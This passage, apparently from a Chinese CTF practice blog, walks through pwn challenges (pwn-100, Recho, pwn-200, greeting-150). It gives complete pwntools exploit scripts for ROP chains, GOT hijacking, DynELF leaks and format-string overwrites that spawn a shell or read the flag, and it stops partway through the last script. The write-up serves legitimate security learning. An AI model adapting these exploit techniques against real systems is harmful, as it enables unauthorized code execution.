 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215235442.png" alt="image-20210413215235442" style="zoom:67%;">
<p>所以这里可以使用这个gadget构建read函数向.bss段写入/bin/sh</p>
<p>由于是64位程序，还要找到一个pop rdi的地址是0x400763</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215305789.png" alt="image-20210413215305789" style="zoom:67%;">
<p>Payload脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./pwn-100&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn-100&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;37423&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400763</span><br>pop_6 = <span class="hljs-number">0x040075A</span><br>mov_3 = <span class="hljs-number">0x0400740</span><br>start = <span class="hljs-number">0x0400550</span><br><br><span class="hljs-comment">#构造rop链，泄露puts函数真实地址</span><br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)<br>payload1 = payload1.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\x0a&#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#把接收末尾的\0a替换为\00</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br><br><span class="hljs-comment">#用偏移量计算程序中的地址</span><br>libc_puts=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br><br><span class="hljs-comment">#用read函数向0x601040写入</span><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_6) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(read_got) + p64(<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x601040</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#Gadget 需要布置六个寄存器（rbx/rbp/r12/r13/r14/r15）加一个 ret 返回地址，x64 下至少需要 56 个字节的栈空间</span><br><span class="hljs-comment">#所以mov_3之后的需要56个字节才能到返回到start</span><br>payload2 += p64(mov_3) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(start) <br>payload2 = payload2.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload2)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\n&#x27;</span>)<br><span class="hljs-comment">#写入/bin/sh</span><br>p.send(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment">#构造rop链进行getshell</span><br>payload3 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x601040</span>) + p64(system_addr) <br>payload3 = payload3.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-recho-构造系统调用劫持got表"><a class="markdownIt-Anchor" href="#攻防世界-pwn-recho-构造系统调用劫持got表"></a> 攻防世界-pwn-Recho-构造系统调用劫持got表</h1>
<p>1.首先看一下程序的保护机制，只开启了NX保护</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220457874.png" alt="image-20210413220457874" style="zoom:67%;">              
<p>2.然后使用ida分析 ，主函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220516158.png" alt="image-20210413220516158" style="zoom:67%;">
<p>可以看出，程序会先读取我们输入的数字，然后我们输入这个长度的字符串，然后程序会进行输出，然后我们注意到字符串里有一个flag，可能之后会用到</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220534899.png" alt="image-20210413220534899" style="zoom:67%;">
<p>首先我们要考虑的是结束主函数的循环，pwntools里有一个shutdown的功能，可以用这个功能结束循环，但是就不能重新rop到主函数进行获取输入了，我们必须一次性完成所有操作。</p>
<p>由于要一次性完成操作，所以不能用之前的泄露地址的方法，这里因为数据段中存在flag，像open，write，read，alarm之类函数都存在系统调用（syscall）所以我们可以利用这个，可以直接抓取flag然后打印出来</p>
<p>故我们需要构造一个这样的代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>,READONLY); <br><span class="hljs-built_in">read</span>(fd,buf,<span class="hljs-number">100</span>); <br><span class="hljs-built_in">printf</span>(buf); <br></code></pre></td></tr></table></figure>
<p>用gdb动态调试时对alarm进行分析</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220620011.png" alt="image-20210413220620011" style="zoom:67%;">
<p>偏移为5的位置存在syscall,所以我们要进行劫持got表，首先我们得用</p>
<p>ROPgadget找到几个需要用到的构造代码</p>
<p>1.pop_rdi_ret=0x4008a3</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220641797.png" alt="image-20210413220641797" style="zoom:67%;">
<p>2.pop_rax_ret=0x4006fc</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220701351.png" alt="image-20210413220701351" style="zoom:67%;">
<p>3.add_rdi_ret = 0x40070d</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413220732971.png" alt="image-20210413220732971"></p>
<p>所以劫持alarm的got表的构造如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># alarm() ---&gt; syscall</span><br><span class="hljs-comment"># alarm_got = alarm_got + 0x5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rdi = alarm_got</span><br>payload += p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br></code></pre></td></tr></table></figure>
<p>第二步：构造fd = open(“flag”,READONLY)，由于open的系统调用号为2，所以把rax设置为2后调用syscall即可调用open()，ida中flag的地址为0x601058</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220815449.png" alt="image-20210413220815449" style="zoom:67%;">
<p>还需要一个pop_rsi_ret = 0x4008a1</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220835212.png" alt="image-20210413220835212"></p>
<p>所以构造如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br></code></pre></td></tr></table></figure>
<p>第三步：构造read(fd,buf,100)，可以直接把flag文件打开，并且存放到一个可以读写的位置，因为.bss段是可以读写的，所以我们需要一个地址存储读出来的flag，这里我们选择buf=0x601068</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220907110.png" alt="image-20210413220907110" style="zoom:67%;">
<p>还需要一个pop_rdx_ret = 0x4006fe</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220925801.png" alt="image-20210413220925801" style="zoom:67%;">
<p>所以构造如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br>第四步：构造printf(buf)<br><span class="hljs-comment">#print flag</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br>根据以上描述，构造payload如下<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./Recho&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41714&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x4008a3</span><br>pop_rax_ret = <span class="hljs-number">0x4006fc</span><br>add_rdi_ret = <span class="hljs-number">0x40070d</span><br>pop_rsi_ret = <span class="hljs-number">0x4008a1</span><br>pop_rdx_ret = <span class="hljs-number">0x4006fe</span><br>alarm_plt=elf.plt[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>alarm_got=elf.got[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>flag = <span class="hljs-number">0x601058</span><br>buf = <span class="hljs-number">0x601068</span><br><br><span class="hljs-comment"># 劫持alarm的got表</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># rdi = alarm_got</span><br>payload+= p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br><br><span class="hljs-comment"># 构造 fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br>payload+=p64(pop_rdx_ret)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br><span class="hljs-comment"># 构造 read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br><br><span class="hljs-comment">#构造 printf(buf)</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to Recho server!\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.shutdown(<span class="hljs-string">&#x27;send&#x27;</span>)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-pwn-200-dynelf模块使用"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn-200-dynelf模块使用"></a> 攻防世界-pwn-pwn-200-DynELF模块使用</h1>
<p>1.先检查程序保护，32位程序，发现只开启了NX保护</p>
<p>​          <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221127258.png" alt="image-20210413221127258" style="zoom:67%;"></p>
<p>2.使用ida查看函数，主函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221142918.png" alt="image-20210413221142918" style="zoom:67%;">
<p>发现在sub_8048484()函数下存在栈溢出漏洞</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221159623.png" alt="image-20210413221159623" style="zoom:67%;">
<p>该题无libc，我们可以使用pwntool的DynELF模块</p>
<p>此题目借助DynElF模块实现有一下要点</p>
<p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下借助DynELF实现利用的要点：</p>
<p>1）调用write函数来泄露地址信息，比较方便；</p>
<p>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</p>
<p>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</p>
<p>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p>
<h3 id="dynelf模块介绍"><a class="markdownIt-Anchor" href="#dynelf模块介绍"></a> DynELF模块介绍</h3>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br><br> <span class="hljs-comment">#各种预处理</span><br><br> payload = <span class="hljs-string">&quot;xxxxxxxx&quot;</span> + address + <span class="hljs-string">&quot;xxxxxxxx&quot;</span><br><br> p.send(payload)<br><br> <span class="hljs-comment">#各种处理</span><br><br> data = p.recv(<span class="hljs-number">4</span>)<br><br> log.debug(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (address, (data **<span class="hljs-keyword">or</span>** <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br><br> <span class="hljs-keyword">return</span> data<br><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">&quot;./xxx&quot;</span>))   <span class="hljs-comment">#初始化DynELF模块</span><br><br>systemAddress = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>) <span class="hljs-comment">#在libc文件中搜索system函数的地址</span><br></code></pre></td></tr></table></figure>
<p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p>
<p>借助write函数，可以实现泄露</p>
<p>所以我们的leak函数可以这么写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    r.send(payload)<br>    data=r.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> r.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br></code></pre></td></tr></table></figure>
<p>我们还需要找到一个连续3次pop的地址，这里找到的是0x0804856c</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221514111.png" alt="image-20210413221514111" style="zoom:67%;">
<p>然后我们需要一个bss段写入，这里可以用0x0804A020</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221605895.png" alt="image-20210413221605895" style="zoom:67%;">
<p>准备了这些条件后，我们就可以构建payload脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;220.249.52.134&quot;</span>,<span class="hljs-number">36377</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn200&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>start_addr=<span class="hljs-number">0x080483d0</span><br>vulnaddress=<span class="hljs-number">0x08048484</span><br>elf=ELF(<span class="hljs-string">&quot;./pwn-200&quot;</span>)<br>write_plt=elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_addr = <span class="hljs-number">0x0804a020</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    p.send(payload)<br>    data=p.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> p.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br><span class="hljs-comment">#调用_start函数，恢复栈</span><br>payload1 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload1 += p32(start_addr)<br>p.send(payload1)<br>p.recv()<br><br>ppp_addr = <span class="hljs-number">0x0804856c</span>  <span class="hljs-comment">#获取到的连续3次pop操作的gadget的地址 </span><br>payload2 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload2 += p32(read_plt)<br>payload2 += p32(ppp_addr)<br>payload2 += p32(<span class="hljs-number">0</span>)<br>payload2 += p32(bss_addr)<br>payload2 += p32(<span class="hljs-number">8</span>)<br>payload2 += p32(sys_addr) + p32(vulnaddress) + p32(bss_addr)<br><span class="hljs-comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span><br><span class="hljs-comment">#构造read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span><br><span class="hljs-comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span><br>p.send(payload2)<br>p.send(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"><a class="markdownIt-Anchor" href="#攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"></a> 攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环</h1>
<p>1.首先检查程序</p>
<p>​      <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221809095.png" alt="image-20210413221809095" style="zoom:67%;"></p>
<p>32位程序，只开启了栈保护和堆栈不可执行</p>
<p>2.用ida查看程序中的函数</p>
<p>主函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221907760.png" alt="image-20210413221907760" style="zoom:67%;">
<p>该程序的大致就是向v5读入64字节，读入成功后，将v5的内容输出到s里面，之后将s直接输出，这最后一个printf(&amp;s)存在一个格式化字符串漏洞，可以进行利用，进行任意地址读写</p>
<p>3.接下来需要测试偏移</p>
<p>输入</p>
<p>.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221928354.png" alt="image-20210413221928354"></p>
<p>可以看到对于该程序，输出的第43个字节是我们的”.”号的ASCII码值0x2e</p>
<p>但是该程序没有循环，就算是我们覆盖了got表的地址，也无法再次返回程序了，这时候我们需要用到一个可以使用格式化字符串漏洞使程序无限循环的漏洞</p>
<p>此漏洞原理为：写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。</p>
<p>具体流程如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221946280.png" alt="image-20210413221946280" style="zoom:67%;">
<p>简单地说，在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p>
<p>而我们的目标就是修改.fini_array数组的第一个元素为start。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。</p>
<p>所以当main运行第一次时，将strlen函数的got表覆写成system的plt地址，然后将.fini._arra第一个元素覆写成strat地址，进而造成循环，第二次main函数时，输入“/bin/sh\x00”，在调用strlen函数时就会变成system(&quot;/bin/sh&quot;),进而拿到shell。</p>
<p>经过查看，system的plt表地址为0x8048490</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222012210.png" alt="image-20210413222012210" style="zoom:67%;"> 
<p>调用的fini_got = 0x8049934</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222025348.png" alt="image-20210413222025348" style="zoom:67%;">
<p>又知道这里的数据为0x80485A0,又因为main函数的地址为0x08485ED，所以我们只需要修改后2位的数据即可让调用fini的时候返回main函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222048628.png" alt="image-20210413222048628" style="zoom:67%;">
<p>然后通过查看知道strlen的got表地址为0x8049A54</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222103549.png" alt="image-20210413222103549" style="zoom:67%;">
<p>综上所述</p>
<p>fini_got = 0x8049934</p>
<p>main_addr = 0x80485ED</p>
<p>strlen_got = 0x8049A54</p>
<p>system_plt = 0x8048490</p>
<p>因此设置一个数组为</p>
<p>arr = [</p>
<p>0x85ED,</p>
<p>0x8490,0x804</p>
<p>]</p>
<p>因此，我们要在fini_got写入2字节数据arr[0]</p>
<p>在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]</p>
<p>进而构造payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-number">46970</span>)   <br>fini_got = <span class="hljs-number">0x8049934</span>  <br>main_addr = <span class="hljs-number">0x80485ED</span>  <br>strlen_got = <span class="hljs-number">0x8049A54</span>  <br>system_plt = <span class="hljs-number">0x8048490</span>  <br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)  <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">2</span>  <br>payload += p32(strlen_got)  <br>payload +=  p32(strlen_got+<span class="hljs-number">2</span>)  <br>payload += p32(fini_got)  <br>arr = [  <br>   <span class="hljs-number">0x85ED</span>,  <br>   <span class="hljs-number">0x8490</span>,<span class="hljs-number">0x804</span>  <br>]  <br><span class="hljs-comment">#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  </span><br><span class="hljs-comment">#修改strlen GOT内容的前2字节  </span><br>num = arr[<span class="hljs-number">2</span>] - <span class="hljs-number">32</span>  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%13$hn&#x27;</span>  <br><span class="hljs-comment">#修改strlen GOT内容的后2字节  </span><br>num = arr[<span class="hljs-number">1</span>] - arr[<span class="hljs-number">2</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%12$hn&#x27;</span>  <br><span class="hljs-comment">#修改fini的后2字节  </span><br>num = arr[<span class="hljs-number">0</span>] - arr[<span class="hljs-number">1</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%14$hn&#x27;</span>  <br><span class="hljs-built_in">print</span> <span 